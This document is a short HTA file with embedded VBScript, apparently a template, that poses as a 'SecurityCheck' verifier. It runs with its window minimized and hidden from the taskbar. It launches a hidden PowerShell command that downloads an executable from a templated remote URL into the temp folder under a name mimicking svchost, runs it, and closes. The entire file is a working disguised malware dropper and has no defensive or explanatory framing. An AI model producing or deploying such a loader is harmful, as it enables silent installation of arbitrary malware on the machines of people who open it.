<html>
<head>
<HTA:APPLICATION
    ID="fishVerifier"
    APPLICATIONNAME="SecurityCheck"
    WINDOWSTATE="minimize"
    SHOWINTASKBAR="no"
    CAPTION="no"
    BORDER="none"
    SYSMENU="no"
    SCROLL="no"
    INNERBORDER="no"
    SELECTION="no"
    NAVIGABLE="no"
    CONTEXTMENU="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no" />
<script language="VBScript">
On Error Resume Next

Dim sh, tempDir, exePath, cmd

Set sh = CreateObject("WScript." & "Shell")
tempDir = sh.ExpandEnvironmentStrings("%TEMP%")
Randomize
exePath = tempDir & "\svchost_" & CStr(Int(Rnd() * 900000) + 100000) & ".exe"

cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & {{ payload_url|tojson }} & "','" & exePath & "'); Start-Process -FilePath '" & exePath & "'"""
sh.Run cmd, 0, False

window.close
</script>
</head>
<body></body>
</html>
